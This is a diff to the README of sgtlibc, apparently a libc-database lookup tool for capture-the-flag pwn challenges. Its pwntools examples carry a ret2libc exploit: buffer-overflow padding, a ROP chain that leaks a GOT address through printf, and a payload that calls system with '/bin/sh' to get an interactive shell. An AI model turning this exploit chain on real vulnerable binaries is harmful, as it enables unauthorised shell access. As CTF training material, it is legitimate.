@@ -88,15 +88,19 @@ print(s.dump(['system','str_bin_sh']))
 
 - `--update` is for update libc database from internet base on `libc-database` , **require non-microsoft-window**  system
 
-
+### python run
 
 - run [python code above](/#/Quick Start) , you'll get output-result like following shows:
 
 ![image-20220605212842313](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605212842313.png)
 
+### command run
+
 - run command in terminal , you'll get output-result like following shows:
 
   ![image-20220605213023151](https://raw.githubusercontent.com/serfend/res.image.reference/main/image-20220605213023151.png)
+
+### pwntools run
 
 - use in `pwntools`
 
@@ -104,12 +108,26 @@ print(s.dump(['system','str_bin_sh']))
 from pwn import * # should run pip install pwntools before
 import sgtlibc
 s = libc.Searcher()
-puts_addr = 0xff1234567aa0 # from leak data
+puts_addr = 0xf71234567aa0 # from leak data
 s.add_condition('puts',puts_addr)
-libc = s.dump() # search libc , if returns multi-result ,default use index-0's result
-offset = puts_addr - libc[sgtlibc.s_puts]  # puts_write
-system_addr = p64(libc[sgtlibc.s_system] + offset)
-binsh_addr = p64(libc[sgtlibc.s_binsh] + offset)
+s.dump(db_index=0) # search libc , if returns multi-result ,default use index-0's result
+system_addr = p00(s.get_address(sgtlibc.s_system))
+binsh_addr = p00(s.get_address(sgtlibc.s_binsh))
+```
+
+
+
+### use user-libc database
+
+```python
+from sgtpyutils import configuration
+
+
+def test_use_user_libc():
+    lib_path = './libs' # here input your libc directory
+    configuration.set('extension_database_path', lib_path)
+    s = LibcSearcher('puts', 0xf7007)
+    s.decided()
 ```
 
 
@@ -134,10 +152,13 @@ set_config(GameBoxConfig(
 ))
 s = sgtlibc.Searcher()
 elf = client.elf
-payload_exp = b'a' * (28 + 4) + p00(0xdeadbeef)  # overflow position
+def exp():
+	payload_exp = [b'a' * (28 + 4),fakeebp()] # overflow position
+    return payload_exp
 def leak(func: str):
-    payload = payload_exp + p00(elf.rop['rdi']) + p00(elf.got[func]) + \
-        p00(elf.plt['printf']) + p00(elf.symbols['main'])
+    payload = exp()
+    # here will auto-pack to p64, you can use p64 or p00 as same effect.
+    payload += [elf.rop['rdi'],elf.got[func],elf.plt['printf'],elf.symbols['main']]
     sl(payload)
     rl()
     data = rc(6).ljust(8, b'\0')
@@ -151,8 +172,9 @@ system_addr = s.get_address(sgtlibc.s_system)
 binsh_addr = s.get_address(sgtlibc.s_binsh)
 log.info(f'system_addr:{hex(system_addr)}')
 log.info(f'binsh_addr:{hex(binsh_addr)}')
-payload = payload_exp + p00(elf.rop['rdi']) + p00(binsh_addr) + \
-    p00(system_addr) + p00(0xdeadbeef)
+payload = exp() 
+payload += [elf.rop['rdi'],binsh_addr,system_addr, fakeebp()]
+    
 sl(payload)
 interactive()
 ```
@@ -167,7 +189,7 @@ interactive()
 
 ## Notice
 
-> default libc database is update long-time ago , we fully recommanded to update it by run `sgtlibc --update`
+> default libc database is update on `2022-06-01`,which long-time ago , we fully recommanded to update it by run `sgtlibc --update`
 
 
 
